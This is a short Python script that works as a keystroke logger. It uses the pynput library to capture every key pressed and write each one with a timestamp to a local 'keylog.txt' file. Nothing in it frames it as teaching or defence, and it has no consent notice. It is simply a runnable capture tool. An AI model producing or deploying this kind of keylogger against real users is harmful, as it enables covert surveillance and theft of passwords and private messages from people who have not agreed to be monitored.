from pynput.keyboard import Key,Listener
import  logging
log_file = "keylog.txt"
logging.basicConfig(filename=log_file,level=logging.DEBUG, format='%(asctime)s: %(message)s')
def on_press(key):
    try:
        logging.info(str(key))
    except Exception as e:
        logging.error(f"Error:{e}")
def start_logging():
    with Listener(on_press=on_press) as listner:
        listner.join()
if __name__ == "__main__":
    start_logging()